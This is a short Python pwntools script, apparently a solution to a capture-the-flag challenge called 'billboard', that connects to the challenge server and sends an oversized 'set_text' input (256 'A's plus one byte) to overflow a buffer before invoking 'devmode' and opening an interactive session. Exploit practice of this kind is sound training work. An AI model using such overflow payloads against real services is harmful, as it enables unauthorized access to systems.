from pwn import *

exe = ELF('../Downloads/server')
context.binary = exe
HOST = "billboard.challs.cyberchallenge.it"
PORT = 9120
p = remote(HOST, PORT)


p.sendlineafter(b'> ', 'set_text ' + "A"*256 + "1")
p.sendlineafter(b'> ', 'devmode')
p.interactive()